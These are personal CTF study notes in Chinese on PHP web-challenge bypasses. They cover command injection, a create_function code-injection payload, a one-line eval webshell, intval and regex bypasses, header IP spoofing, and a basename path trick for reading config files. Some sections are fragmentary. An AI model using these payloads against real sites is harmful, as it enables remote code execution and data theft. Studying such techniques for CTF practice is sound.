[TOC]



##### sort /f*可以代替cat /f*

;竟然可以在执行语句中结束前面的语句

$command="echo hello,".$cm;

例,........($command)

$cm=;tac f* 

........是函数，忘了。  就可以直接执行tac f*

##### 如果变量名是file,可能是php伪协议。

又，当日志注入不行的时候，可以试试php伪协议。

[日志注入漏洞 - NPFS - 博客园 (cnblogs.com)](https://www.cnblogs.com/NPFS/p/13235425.html)

#### create_function

新的执行函数。

```
  $a = $this->param1;
        $b = $this->param2;
           $a('', $b);
```

将 $param1 设置为 create_function ，$param2 设置为 system($_GET[1])，

```
 protected $param1 = "create_function";
    protected $param2 = "};system(\$_POST[1]);//";
```

就可以了。

##### `$_SERVER['HTTP_O2TAKUXX']=="GiveMeFlag")`

在标头中传入   

O2TAKUXX：GiveMeFlag

$_SERVER['HTTP_O2TAKUXX']是在标头中获得一个叫O2TAKUXX的值

##### intval

1. intval(num,进制)

2. 

    

3. 

   这里主要 可以通过进制的方式绕过 因为默认是10进制

4. 

    

5. 

   这里主要是通过 科学计数法绕过

6. 

    

7. 

    

8. 

   1e10 会被识别为1

9. 

    

10. 

    但是 1e10+1后就会恢复原本

```
<?php
$a='1e10';
echo intval($a);
echo "<br />";
echo intval($a+1);
```

遇到非数字的直接停止转换，比如（‘1000’），（‘’125*8）,~~1000,?id=0x3E8,?id=125<<3,?id=999%2B1这些都小于999

[基于intval()函数特性的漏洞绕过_intval函数绕过-CSDN博客](https://blog.csdn.net/m0_73512445/article/details/132356059?ops_request_misc=&request_id=&biz_id=102&utm_term=intval函数的绕过方式&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-132356059.142^v99^pc_search_result_base1&spm=1018.2226.3001.4187)

##### shal()

传数组

#### “<?php ?“>”绕过

```
<script language='php'>@eval($_POST["a"]);</script>
```

###### 是随机数

[[UUCTF 2022 新生赛\]phonecode | NSSCTF](https://www.nssctf.cn/problem/3052)

两个函数：

```
<?php

$cc = 2;
mt_srand($cc);
echo mt_rand().'<br>';
echo mt_rand().'<br>';
echo mt_rand();
?>
```

###### vim泄露

![1704189116104](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1704189116104.png)

用这个命令

###### Content-Type有两个值：

①application/x-www-form-urlencoded(默认值) ：上传键值对
②multipart/form-data：上传文件



###### [$_SERVER[‘QUERY_STRING’\]特性](https://c1oudfl0w0.github.io/blog/2023/03/15/PHP特性/#SERVER-'QUERY-STRING')，只能匹配没有url编码过的数据

[$_REQUEST特性](https://c1oudfl0w0.github.io/blog/2023/03/15/PHP特性/#REQUEST)，传post参数绕过即可



###### php解析特性/////很重套



空格、+ - [ .  都可以换成_,我们这里用空格代替

###### 修改IP

CLIENT-IP: 
X-FORWARDED-FOR: 
X-REAL-IP:

###### basename与$_SERVER['PHP_SELF']

```
if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
  exit("I don't know what you are thinking, but I won't let you read it :)");
}

if (isset($_GET['source'])) {
  highlight_file(basename($_SERVER['PHP_SELF']));
  exit();
}

已知flag在config.php中。

$_SERVE[‘PHP_SELF’]读取的是当前执行脚本的路径（包含文件名），http://example.com/foo/bar.php的脚本中使用$_SERVER['PHP_SELF']将得到/foo/bar.php

basename则可以返回路径中的文件名部分

如果传入/index.php/config.php/，则$_SERVER['PHP_SELF']返回/index.php/config.php/，

basename($_SERVER['PHP_SELF'])返回config.php
即/index.php/config.php/运行的是index.php,但是basename()获取到的是config.php

即basename()匹配的是尾部。

但是上面有一个正则。我们使用%0d 之类的来污染绕过 (basename()函数存在一个问题，它会去掉文件名开头的非ASCII值)

payload:/index.php/config.php/%ff?source
加上%ff将正则过掉。basename会自动去掉%ff,直接返回config.php.得到flag
```

#### php的变量解析绕过, php会把请求参数中的非法字符转为下划线